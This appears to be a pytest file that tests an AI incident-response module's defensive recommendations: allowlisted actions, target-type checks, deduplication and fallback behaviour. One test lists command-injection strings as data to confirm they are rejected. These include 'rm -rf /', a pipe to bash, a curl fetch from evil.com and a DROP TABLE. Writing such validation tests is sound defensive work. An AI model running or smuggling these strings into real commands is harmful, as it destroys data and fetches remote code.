"""
==============================================================================
FILE: apps/api/app/ai/tests/test_recommendations.py
ROLE / OWNERSHIP: AI & Security Intelligence Engineers
OBJECTIVE: Unit and integration tests for Defensive Recommendations generation,
           allowlist enforcement, command injection rejection, target type
           validation, and minimum necessary action principle.
==============================================================================
"""

import pytest
from app.ai.contracts import (
    InvestigationContext,
    IncidentContext,
    EvidenceItem,
    DetectionContext,
    AssetContext,
    AIInvestigationResult,
    AIRecommendation,
    ConfidenceAssessment,
)
from app.ai.recommendations import (
    generate_recommendations,
    validate_recommendation,
    validate_recommendations_list,
    create_fallback_recommendations,
    format_recommendations_markdown,
)


def make_recommendations_test_context() -> InvestigationContext:
    """Creates a standard InvestigationContext for testing recommendations."""
    return InvestigationContext(
        incident=IncidentContext(
            id="INC-REC-1",
            title="Database Exfiltration Incident",
            severity="CRITICAL",
            status="ACTIVE",
            primaryAffectedAssetId="asset-prod-db",
            relatedAssetIds=["asset-web-app"],
            detectionEventIds=["DET-SQL-1"],
            createdAt="2026-09-24T00:00:00Z",
            updatedAt="2026-09-24T00:00:00Z",
        ),
        evidence=[
            EvidenceItem(
                id="EV-1",
                type="TELEMETRY_EVENT",
                source="asset-web-app",
                timestamp="2026-09-24T00:00:00Z",
                summary="Malicious payload from 198.51.100.77",
                content={"sourceIp": "198.51.100.77", "sessionToken": "sess-compromised-99"},
                verified=True,
            ),
            EvidenceItem(
                id="EV-2",
                type="TELEMETRY_EVENT",
                source="asset-prod-db",
                timestamp="2026-09-24T00:01:00Z",
                summary="Unauthorized DB dump transfer",
                content={"destIp": "198.51.100.77"},
                verified=True,
            ),
        ],
        detections=[
            DetectionContext(
                id="DET-SQL-1",
                ruleId="RULE-SQLI",
                ruleName="SQL Injection Detected",
                description="SQL Injection on web application",
                severity="CRITICAL",
                confidence=0.98,
                matchedEventIds=["EV-1"],
                primaryAssetId="asset-web-app",
                timestamp="2026-09-24T00:00:00Z",
                evidenceSummary="SQL injection from 198.51.100.77",
            )
        ],
        assets=[
            AssetContext(id="asset-web-app", name="Web Application", type="WEB_SERVER", criticality="HIGH"),
            AssetContext(id="asset-prod-db", name="Production Database", type="DATABASE", criticality="CRITICAL"),
        ],
    )


def test_7_recommendation_uses_only_allowed_actions():
    """TEST 7: Valid allowlisted actions succeed; non-allowlisted actions fail validation."""
    context = make_recommendations_test_context()

    valid_rec = AIRecommendation(
        id="rec-1",
        actionType="BLOCK_SOURCE",
        targetIdentifier="198.51.100.77",
        targetType="IP_ADDRESS",
        rationale="Block attacker IP address.",
        confidence=0.95,
        expectedImpact="Prevent further malicious requests.",
        supportingEvidenceIds=["EV-1"],
    )
    is_valid, errors = validate_recommendation(valid_rec, context)
    assert is_valid is True
    assert len(errors) == 0

    # Non-allowlisted action
    with pytest.raises(Exception):
        # Pydantic v2 Literal validation catches non-allowlisted actions
        AIRecommendation(
            id="rec-bad",
            actionType="EXECUTE_SCRIPT",  # type: ignore
            targetIdentifier="198.51.100.77",
            targetType="IP_ADDRESS",
            rationale="Run custom firewall script",
            confidence=0.9,
            expectedImpact="Script run",
            supportingEvidenceIds=["EV-1"],
        )


def test_8_recommendation_rejects_arbitrary_commands():
    """TEST 8: Rejects command injection or shell syntax inside target identifier."""
    context = make_recommendations_test_context()

    bad_commands = [
        "198.51.100.77; rm -rf /",
        "198.51.100.77 | bash",
        "$(curl http://evil.com/pwn.sh)",
        "asset-prod-db; DROP TABLE users;",
    ]

    for bad_cmd in bad_commands:
        rec = AIRecommendation(
            id="rec-injected",
            actionType="BLOCK_SOURCE",
            targetIdentifier=bad_cmd,
            targetType="IP_ADDRESS",
            rationale="Malicious command target",
            confidence=0.9,
            expectedImpact="Harmful",
            supportingEvidenceIds=["EV-1"],
        )
        is_valid, errors = validate_recommendation(rec, context)
        assert is_valid is False
        assert any("command" in err.lower() or "syntax" in err.lower() for err in errors)


def test_9_recommendation_valid_target_types():
    """TEST 9: Enforces valid target type mapping for each action."""
    context = make_recommendations_test_context()

    # BLOCK_SOURCE with ASSET_ID is invalid (must be IP_ADDRESS)
    rec_invalid_target = AIRecommendation(
        id="rec-mismatch",
        actionType="BLOCK_SOURCE",
        targetIdentifier="asset-web-app",
        targetType="ASSET_ID",  # Invalid for BLOCK_SOURCE
        rationale="Mismatch test",
        confidence=0.9,
        expectedImpact="None",
        supportingEvidenceIds=["EV-1"],
    )
    is_valid, errors = validate_recommendation(rec_invalid_target, context)
    assert is_valid is False
    assert any("target type" in err.lower() for err in errors)

    # ISOLATE_RESOURCE with non-existent asset ID is invalid
    rec_missing_asset = AIRecommendation(
        id="rec-isolate-bad",
        actionType="ISOLATE_RESOURCE",
        targetIdentifier="asset-fabricated-99",
        targetType="ASSET_ID",
        rationale="Isolate non-existent host",
        confidence=0.9,
        expectedImpact="None",
        supportingEvidenceIds=["EV-1"],
    )
    is_valid, errors = validate_recommendation(rec_missing_asset, context)
    assert is_valid is False
    assert any("asset" in err.lower() for err in errors)


def test_10_minimum_necessary_action_and_deduplication():
    """TEST 10: Generates bounded set of actions, deduplicating multiple recommendations for same target."""
    context = make_recommendations_test_context()

    raw_recs = [
        AIRecommendation(
            id="rec-1",
            actionType="BLOCK_SOURCE",
            targetIdentifier="198.51.100.77",
            targetType="IP_ADDRESS",
            rationale="Low confidence block",
            confidence=0.7,
            expectedImpact="Block IP",
            supportingEvidenceIds=["EV-1"],
        ),
        AIRecommendation(
            id="rec-2",
            actionType="BLOCK_SOURCE",
            targetIdentifier="198.51.100.77",
            targetType="IP_ADDRESS",
            rationale="High confidence block",
            confidence=0.96,
            expectedImpact="Block IP directly",
            supportingEvidenceIds=["EV-1", "EV-2"],
        ),
        AIRecommendation(
            id="rec-3",
            actionType="ISOLATE_RESOURCE",
            targetIdentifier="asset-prod-db",
            targetType="ASSET_ID",
            rationale="Isolate database to stop exfiltration",
            confidence=0.92,
            expectedImpact="Sever DB network access",
            supportingEvidenceIds=["EV-2"],
        ),
    ]

    result = AIInvestigationResult(
        incidentId="INC-REC-1",
        status="SUCCESS",
        summary="Exfiltration in progress.",
        severity="CRITICAL",
        confidence=ConfidenceAssessment(score=0.95, rationale="Confirmed", evidenceCompleteness="HIGH", limitations=[]),
        recommendedActions=raw_recs,
        affectedAssetIds=["asset-prod-db", "asset-web-app"],
        citedEvidenceIds=["EV-1", "EV-2"],
    )

    final_recs = generate_recommendations(result, context)

    # Should deduplicate 198.51.100.77 keeping the 0.96 confidence one
    assert len(final_recs) == 2
    block_rec = next(r for r in final_recs if r.actionType == "BLOCK_SOURCE")
    assert block_rec.confidence == 0.96


def test_14_recommendation_fallback():
    """TEST 14: Fallback recommendations produce safe baseline action on critical incident."""
    context = make_recommendations_test_context()

    # Fallback when status is INVALID
    invalid_result = AIInvestigationResult(
        incidentId="INC-REC-1",
        status="INVALID",
        summary="LLM failed parsing.",
        severity="CRITICAL",
        confidence=ConfidenceAssessment(score=0.0, rationale="Error", evidenceCompleteness="INSUFFICIENT", limitations=[]),
        errorMessage="Model output was malformed.",
    )

    recs = generate_recommendations(invalid_result, context)
    assert len(recs) == 1
    assert recs[0].actionType == "BLOCK_SOURCE"
    assert recs[0].targetIdentifier == "198.51.100.77"


def test_recommendations_formatter():
    """TEST: Formats recommendations as analyst-facing Markdown."""
    recs = [
        AIRecommendation(
            id="rec-1",
            actionType="BLOCK_SOURCE",
            targetIdentifier="198.51.100.77",
            targetType="IP_ADDRESS",
            rationale="Direct attacker IP.",
            confidence=0.98,
            expectedImpact="Terminates connection.",
            supportingEvidenceIds=["EV-1"],
            priority="IMMEDIATE",
        )
    ]

    md = format_recommendations_markdown(recs)
    assert "### Defensive Recommendations (Advisory Only)" in md
    assert "BLOCK_SOURCE" in md
    assert "198.51.100.77" in md
    assert "IMMEDIATE" in md
